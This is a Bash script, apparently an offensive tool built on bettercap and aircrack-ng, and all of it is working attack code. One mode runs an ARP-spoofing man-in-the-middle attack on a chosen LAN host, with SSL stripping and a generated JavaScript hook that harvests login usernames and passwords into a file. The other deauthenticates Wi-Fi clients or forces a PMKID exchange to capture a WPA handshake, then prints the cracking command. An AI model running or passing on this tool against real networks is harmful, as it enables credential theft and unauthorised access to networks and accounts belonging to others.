#!/bin/bash

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Run as root (sudo).${NC}"; exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
CRED_FILE="$SCRIPT_DIR/credentials.txt"
CRED_HOOK="$SCRIPT_DIR/credential_hook.js"

mkdir -p "$HANDSHAKE_DIR"

if [[ ! -f "$CRED_HOOK" ]]; then
    cat > "$CRED_HOOK" << EOF
var LOGFILE = "$CRED_FILE";

function writeLog(msg) {
    try {
        var f = new File(LOGFILE);
        f.open("a");
        f.write(msg + "\n");
        f.close();
    } catch (e) {}
}

function parseForm(body) {
    var result = {};
    if (!body) return result;
    var pairs = body.split("&");
    for (var i = 0; i < pairs.length; i++) {
        var kv = pairs[i].split("=");
        if (kv.length === 2) {
            var key = decodeURIComponent(kv[0].replace(/\+/g, " "));
            var val = decodeURIComponent(kv[1].replace(/\+/g, " "));
            result[key.toLowerCase()] = val;
        }
    }
    return result;
}

function onRequest(req, res) {
    var foundUser = null;
    var foundPass = null;
    var data = "";

    if (req.Method === "POST" && req.Body) {
        data = req.Body;
        var fields = parseForm(data);
        var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
        var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
        for (var i = 0; i < userKeys.length; i++) {
            if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
        }
        for (var i = 0; i < passKeys.length; i++) {
            if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
        }
    }

    if (req.Method === "GET" && req.Path) {
        var qIdx = req.Path.indexOf("?");
        if (qIdx !== -1) {
            data = req.Path.substring(qIdx + 1);
            var fields = parseForm(data);
            var userKeys = ["user", "username", "usr", "login", "email", "name", "account"];
            var passKeys = ["pass", "password", "passwd", "pwd", "pass1", "passcode"];
            for (var i = 0; i < userKeys.length; i++) {
                if (fields[userKeys[i]]) { foundUser = fields[userKeys[i]]; break; }
            }
            for (var i = 0; i < passKeys.length; i++) {
                if (fields[passKeys[i]]) { foundPass = fields[passKeys[i]]; break; }
            }
        }
    }

    if (foundUser !== null || foundPass !== null) {
        var line = "========================================\n";
        line += "TIME  : " + new Date().toString() + "\n";
        line += "METHOD: " + req.Method + "\n";
        line += "URL   : http://" + (req.Host || "unknown") + (req.Path || "unknown") + "\n";
        line += "USER  : " + (foundUser !== null ? foundUser : "(not found)") + "\n";
        line += "PASS  : " + (foundPass !== null ? foundPass : "(not found)") + "\n";
        line += "DATA  : " + data + "\n";
        line += "========================================";
        log(line);
        writeLog(line);
    }
}
EOF
fi

print_section() {
    echo -e "\n${BLUE}${BOLD}┌──────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}${BOLD}│ $1${NC}"
    echo -e "${BLUE}${BOLD}└──────────────────────────────────────────────────────┘${NC}"
}
print_ok()   { echo -e "  ${GREEN}[✔]${NC} $1"; }
print_warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
print_err()  { echo -e "  ${RED}[✘]${NC} $1"; }
print_info() { echo -e "  ${CYAN}[i]${NC} $1"; }

reset_adapter() {
    local iface="$1"
    print_info "Resetting adapter ${BOLD}${iface}${NC}..."
    ip link set "$iface" down 2>/dev/null
    sleep 1
    ip link set "$iface" up 2>/dev/null
    sleep 2
    print_ok "Adapter reset done."
}

force_resolve_mac() {
    local ip="$1"
    local iface="$2"
    local mac=""

    ping -c 3 -W 2 "$ip" &>/dev/null
    mac=$(ip neigh show "$ip" 2>/dev/null | awk '/lladdr/ {print $5; exit}')

    if [[ -z "$mac" ]] && command -v arping &>/dev/null; then
        arping -c 3 -I "$iface" "$ip" &>/dev/null
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '/lladdr/ {print $5; exit}')
    fi

    if [[ -z "$mac" ]] && command -v arping &>/dev/null; then
        arping -c 5 -I "$iface" "$ip" &>/dev/null
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '/lladdr/ {print $5; exit}')
    fi

    echo "$mac"
}

verify_handshake() {
    local file="$1"

    if [[ ! -f "$file" ]]; then
        print_err "No capture file at $file"
        return 1
    fi

    print_info "Verifying handshake completeness..."
    local valid=0

    if command -v aircrack-ng &>/dev/null; then
        local ac_out
        ac_out=$(aircrack-ng "$file" 2>&1 | head -30)

        local hs_count
        hs_count=$(echo "$ac_out" | grep -oE 'WPA \([0-9]+ handshake' | grep -oE '[0-9]+' | head -1)

        if [[ -n "$hs_count" && "$hs_count" -ge 1 ]]; then
            print_ok "aircrack-ng: ${BOLD}${hs_count} complete handshake(s) found${NC}"
            echo "$ac_out" | grep -E 'WPA \(|ESSID|BSSID' | sed 's/^/      /'
            valid=1
        else
            print_warn "aircrack-ng: no complete handshake (0 handshake)."
        fi
    else
        print_warn "aircrack-ng not installed, skipping."
    fi

    if command -v tshark &>/dev/null; then
        local eapol_count
        eapol_count=$(tshark -r "$file" -Y "eapol" 2>/dev/null | wc -l | tr -d ' ')
        print_info "EAPOL frames in capture: ${BOLD}${eapol_count}${NC}"

        if [[ "$eapol_count" -ge 2 ]]; then
            print_ok "At least 2 EAPOL frames present (potentially crackable)."
            valid=1
        else
            print_warn "Less than 2 EAPOL frames — handshake is incomplete."
        fi
    else
        print_info "tshark not installed, skipping EAPOL count."
    fi

    if [[ "$valid" -eq 1 ]]; then
        return 0
    else
        return 1
    fi
}

print_section "STEP 0 • Tools Verification"

if command -v bettercap &>/dev/null; then
    BC_VERSION=$(bettercap -version 2>&1 | head -n 1)
    print_ok "bettercap installed: ${BOLD}${BC_VERSION}${NC}"
else
    print_warn "bettercap not found. Installing..."
    apt update -qq && apt install -y bettercap -qq
    if command -v bettercap &>/dev/null; then
        BC_VERSION=$(bettercap -version 2>&1 | head -n 1)
        print_ok "bettercap installed: ${BOLD}${BC_VERSION}${NC}"
    else
        print_err "bettercap installation failed. Install manually: apt install bettercap"
        exit 1
    fi
fi

if command -v aircrack-ng &>/dev/null; then
    print_ok "aircrack-ng installed."
else
    print_warn "aircrack-ng not found. Installing..."
    apt update -qq && apt install -y aircrack-ng -qq
    if command -v aircrack-ng &>/dev/null; then
        print_ok "aircrack-ng installed."
    else
        print_err "aircrack-ng installation failed. Install manually: apt install aircrack-ng"
        exit 1
    fi
fi

print_ok "Handshake folder ready: ${BOLD}${HANDSHAKE_DIR}${NC}"

print_section "STEP 1 • Adapter Detection"

mapfile -t ADAPTERS < <(
    for iface in $(ls /sys/class/net); do
        [[ -d "/sys/class/net/$iface/phy80211" ]] && echo "$iface"
    done
)

if [[ ${#ADAPTERS[@]} -eq 0 ]]; then
    print_err "No wireless adapter found."; exit 1
fi

if [[ ${#ADAPTERS[@]} -eq 1 ]]; then
    IFACE="${ADAPTERS[0]}"
    print_ok "Adapter: ${BOLD}${IFACE}${NC}"
else
    print_info "Multiple adapters:"
    for i in "${!ADAPTERS[@]}"; do
        echo -e "  ${CYAN}[$((i+1))]${NC} ${ADAPTERS[$i]}"
    done
    read -p "$(echo -e "${MAGENTA}➜${NC} Select: ")" CHOICE
    IFACE="${ADAPTERS[$((CHOICE-1))]}"
fi

print_section "STEP 2 • Select Mode"

echo -e "  ${CYAN}[1]${NC} MITM Attack       ${DIM}(scan LAN, show IP list, select target)${NC}"
echo -e "  ${CYAN}[2]${NC} Handshake Capture ${DIM}(scan WiFi, show ESSID list, select AP)${NC}"
echo -e "  ${CYAN}[3]${NC} Exit"
echo
read -p "$(echo -e "${MAGENTA}➜${NC} Option [1-3]: ")" MODE

if [[ "$MODE" == "1" ]]; then
    print_section "MITM Mode • Network Discovery"

    sleep 2

    AUTO_GW=$(ip route | awk '/default/ {print $3; exit}')
    if [[ -z "$AUTO_GW" ]]; then
        print_warn "No default gateway detected."
        read -p "$(echo -e "${MAGENTA}➜${NC} Enter gateway IP manually: ")" AUTO_GW
        if [[ -z "$AUTO_GW" ]]; then
            print_err "Gateway IP required."; exit 1
        fi
    fi
    print_info "Gateway: ${BOLD}${AUTO_GW}${NC}"

    print_info "Warming up gateway ARP cache..."
    ping -c 3 -W 2 "$AUTO_GW" &>/dev/null
    sleep 1

    GW_MAC=$(force_resolve_mac "$AUTO_GW" "$IFACE")
    if [[ -n "$GW_MAC" ]]; then
        print_ok "Gateway MAC: ${BOLD}${GW_MAC}${NC}"
    else
        print_warn "Gateway MAC still unresolved. Spoofing may fail."
    fi

    echo 1 > /proc/sys/net/ipv4/ip_forward
    print_ok "IP Forwarding enabled."

    print_info "Starting network probe (25 seconds, throttle=2)..."
    MITM_LOG="/tmp/mitm_probe_$$.log"
    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
        set net.probe.throttle 2;
        net.probe on;
        sleep 25;
        net.show;
        sleep 3;
        net.probe off;
        exit
    " > "$MITM_LOG" 2>&1

    mapfile -t HOSTS < <(
        grep -E '^\│' "$MITM_LOG" | \
        awk -F'│' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $2);
            gsub(/^[ \t]+|[ \t]+$/, "", $3);
            gsub(/^[ \t]+|[ \t]+$/, "", $4);
            if ($2 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                print $2 "|" $3 "|" $4
            }
        }'
    )

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        print_warn "Bettercap found no hosts. Reading system ARP table..."
        mapfile -t HOSTS < <(
            ip neigh show | awk '
                $3 == "lladdr" && $NF != "FAILED" {
                    print $1 "|" $5 "|" "-"
                }'
        )
    fi
    rm -f "$MITM_LOG"

    if [[ ${#HOSTS[@]} -eq 0 ]]; then
        print_err "No hosts found. AP isolation may be enabled on router."
        print_info "Disable 'AP Isolation' / 'Client Isolation' in router settings."
        echo 0 > /proc/sys/net/ipv4/ip_forward
        exit 1
    fi

    print_section "Discovered Hosts"
    echo
    printf "  ${BOLD}%-4s %-18s %-20s %-20s${NC}\n" "No." "IP" "MAC" "Vendor/Name"
    echo "  ──────────────────────────────────────────────────────────────"
    i=1
    for entry in "${HOSTS[@]}"; do
        IFS='|' read -r ip mac name <<< "$entry"
        printf "  ${CYAN}%-4s${NC} %-18s %-20s %-20s\n" "$i" "$ip" "$mac" "$name"
        ((i++))
    done

    echo
    read -p "$(echo -e "${MAGENTA}➜${NC} Select target IP number: ")" HOST_CHOICE
    IFS='|' read -r TARGET_IP _ _ <<< "${HOSTS[$((HOST_CHOICE-1))]}"

    if [[ -z "$TARGET_IP" ]]; then
        print_err "Invalid selection."
        echo 0 > /proc/sys/net/ipv4/ip_forward
        exit 1
    fi
    print_ok "Target: ${BOLD}${TARGET_IP}${NC}"

    print_info "Forcing target MAC resolution..."
    TARGET_MAC=$(force_resolve_mac "$TARGET_IP" "$IFACE")
    if [[ -z "$TARGET_MAC" ]]; then
        print_err "Target MAC could not be resolved."
        echo 0 > /proc/sys/net/ipv4/ip_forward
        exit 1
    fi
    print_ok "Target MAC: ${BOLD}${TARGET_MAC}${NC}"

    sleep 3

    rm -f "$CRED_FILE"

    print_info "Starting ARP spoof + sniff. Press Ctrl+C to stop."
    echo

    bettercap -iface "$IFACE" -gateway-override "$AUTO_GW" -eval "
    set arp.spoof.fullduplex true;
    set arp.spoof.targets $TARGET_IP;
    set arp.spoof.internal false;
    set net.sniff.verbose true;
    set net.sniff.local true;
    set net.sniff.filter 'host $TARGET_IP';
    set net.sniff.output /tmp/mitm_capture.pcap;
    set https.proxy.sslstrip true;
    set https.proxy.script $CRED_HOOK;
    arp.spoof on;
    https.proxy on;
    net.sniff on
"

    echo
    print_info "Cleaning up..."
    echo 0 > /proc/sys/net/ipv4/ip_forward
    print_ok "IP Forwarding disabled."

    print_section "Credentials Check"
    if [[ -f "$CRED_FILE" ]] && [[ -s "$CRED_FILE" ]]; then
        print_ok "${GREEN}${BOLD}Credentials captured!${NC}"
        echo
        cat "$CRED_FILE"
        print_info "Saved to: ${BOLD}${CRED_FILE}${NC}"
    else
        print_warn "No credentials captured."
        print_info "Possible reasons:"
        echo -e "    ${DIM}• Target did not submit any HTTP login form${NC}"
        echo -e "    ${DIM}• Login was over HTTPS (SSL strip failed or HSTS blocked)${NC}"
        echo -e "    ${DIM}• Credentials field names not recognized by hook${NC}"
        echo -e "    ${DIM}• Check pcap: /tmp/mitm_capture.pcap (Wireshark filter: http.request.method == \"POST\")${NC}"
    fi

elif [[ "$MODE" == "2" ]]; then
    print_section "Handshake Mode • WiFi Scan"

    print_info "Scanning WiFi networks (20 seconds)..."
    print_warn "Monitor mode will be enabled automatically."

    SCAN_LOG="/tmp/wifi_scan_$$.log"
    bettercap -iface "$IFACE" -eval "
        wifi.recon on;
        sleep 20;
        wifi.show;
        sleep 3;
        wifi.recon off;
        exit
    " > "$SCAN_LOG" 2>&1

    mapfile -t APS < <(
        grep -E '^\│' "$SCAN_LOG" | \
        awk -F'│' '{
            gsub(/^[ \t]+|[ \t]+$/, "", $2);
            gsub(/^[ \t]+|[ \t]+$/, "", $3);
            gsub(/^[ \t]+|[ \t]+$/, "", $4);
            gsub(/^[ \t]+|[ \t]+$/, "", $7);
            if ($3 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $4 != "") {
                print $3 "|" $4 "|" $7
            }
        }'
    )
    rm -f "$SCAN_LOG"

    if [[ ${#APS[@]} -eq 0 ]]; then
        print_err "No networks found. Try again."
        exit 1
    fi

    print_section "Discovered Networks"
    echo
    printf "  ${BOLD}%-4s %-32s %-8s${NC}\n" "No." "ESSID" "Channel"
    echo "  ──────────────────────────────────────────────"
    i=1
    for entry in "${APS[@]}"; do
        IFS='|' read -r bssid essid ch <<< "$entry"
        printf "  ${CYAN}%-4s${NC} %-32s %-8s\n" "$i" "$essid" "$ch"
        ((i++))
    done

    echo
    read -p "$(echo -e "${MAGENTA}➜${NC} Select network number: ")" AP_CHOICE
    IFS='|' read -r TARGET_BSSID TARGET_ESSID TARGET_CHANNEL <<< "${APS[$((AP_CHOICE-1))]}"

    if [[ -z "$TARGET_BSSID" ]]; then
        print_err "Invalid selection."
        exit 1
    fi

    print_ok "Target: ${BOLD}${TARGET_ESSID}${NC} (${TARGET_BSSID}) Ch ${TARGET_CHANNEL}"

    SAFE_ESSID=$(echo "$TARGET_ESSID" | tr -c 'A-Za-z0-9_-' '_')

    print_section "Handshake Save Location"
    echo -e "  ${CYAN}[1]${NC} ${BOLD}${HANDSHAKE_DIR}/${SAFE_ESSID}.pcap${NC} (default)"
    echo -e "  ${CYAN}[2]${NC} /root/${SAFE_ESSID}.pcap"
    echo
    read -p "$(echo -e "${MAGENTA}➜${NC} Choice [1-2, default 1]: ")" PATH_CHOICE

    case "$PATH_CHOICE" in
        2) HS_FILE="/root/${SAFE_ESSID}.pcap" ;;
        *) HS_FILE="$HANDSHAKE_DIR/${SAFE_ESSID}.pcap" ;;
    esac

    rm -f "$HS_FILE"
    print_ok "Handshake file: ${BOLD}${HS_FILE}${NC}"

    reset_adapter "$IFACE"
    print_info "Attempt 1: Clientless PMKID via wifi.assoc (15s)..."

    ASSOC_LOG="/tmp/assoc_$$.log"
    bettercap -iface "$IFACE" -eval "
        set wifi.handshakes.file $HS_FILE;
        wifi.recon on;
        wifi.recon.channel $TARGET_CHANNEL;
        sleep 3;
        wifi.assoc $TARGET_BSSID;
        sleep 15;
        wifi.recon off;
        exit
    " > "$ASSOC_LOG" 2>&1

    if [[ ! -f "$HS_FILE" ]]; then
        print_warn "wifi.assoc did not produce a capture file."
        reset_adapter "$IFACE"

        print_info "Attempt 2: wifi.deauth fallback (25s)..."
        print_warn "Deauth requires at least one client connected to the AP."

        DEAUTH_LOG="/tmp/deauth_$$.log"
        bettercap -iface "$IFACE" -eval "
            set wifi.handshakes.file $HS_FILE;
            set wifi.deauth.acquired true;
            wifi.recon on;
            wifi.recon.channel $TARGET_CHANNEL;
            sleep 3;
            wifi.deauth $TARGET_BSSID;
            sleep 25;
            wifi.recon off;
            exit
        " > "$DEAUTH_LOG" 2>&1

        if grep -q "unknown BSSID, is in the deauth skip list, or doesn't have detected clients" "$DEAUTH_LOG"; then
            print_err "Deauth rejected: no client detected on this AP."
            print_info "Connect a device to '${TARGET_ESSID}' and try again."
        fi
        rm -f "$DEAUTH_LOG"
    else
        print_ok "PMKID attempt succeeded (file created)."
    fi

    rm -f "$ASSOC_LOG"

    echo
    print_section "Handshake Verification"

    if [[ -f "$HS_FILE" ]]; then
        print_ok "Capture file: ${BOLD}${HS_FILE}${NC}"
        echo

        if verify_handshake "$HS_FILE"; then
            echo
            print_ok "${GREEN}${BOLD}Handshake is COMPLETE and valid for cracking.${NC}"
            print_info "Crack with: aircrack-ng -w <wordlist> \"$HS_FILE\""
        else
            echo
            print_warn "${YELLOW}Handshake may be INCOMPLETE (half capture).${NC}"
            print_info "Try again — connect a device to the AP and re-run."
        fi
    else
        print_warn "No capture file created at $HS_FILE"
        print_info "Possible reasons:"
        echo -e "    ${DIM}• No client connected to the AP (deauth needs one)${NC}"
        echo -e "    ${DIM}• AP is not PMKID-vulnerable (assoc skipped)${NC}"
        echo -e "    ${DIM}• PMF (802.11w) enabled on router — blocks deauth${NC}"
        echo -e "    ${DIM}• Adapter does not support monitor mode + injection${NC}"
    fi

elif [[ "$MODE" == "3" ]]; then
    print_info "Exiting."
    exit 0

else
    print_err "Invalid option."
    exit 1
fi

echo
echo -e "${GREEN}${BOLD}✔ Script complete.${NC}"
